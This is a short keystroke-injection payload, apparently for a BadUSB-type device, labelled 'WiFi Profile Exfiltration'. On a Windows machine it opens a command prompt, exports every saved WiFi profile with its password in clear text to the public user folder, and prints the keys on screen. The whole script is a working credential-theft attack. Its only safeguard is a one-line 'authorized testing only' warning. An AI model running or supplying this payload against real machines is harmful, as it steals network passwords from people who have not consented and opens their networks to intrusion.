// WiFi Profile Exfiltration (Windows) — Dumps saved WiFi passwords via netsh
// WARNING: For authorized penetration testing only.
layout('us');
delay(1000);

// Open CMD
press("GUI r");
delay(500);
type("cmd\n");
delay(1000);

// Export all WiFi profiles with keys to a file
type("netsh wlan export profile key=clear folder=C:\\Users\\Public\n");
delay(3000);

// Show WiFi passwords inline
type("for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr \"Profile\"') do @netsh wlan show profile name=%a key=clear 2>nul | findstr \"Key Content\"\n");
delay(5000);

console.log("WiFi profiles exported to C:\\Users\\Public");
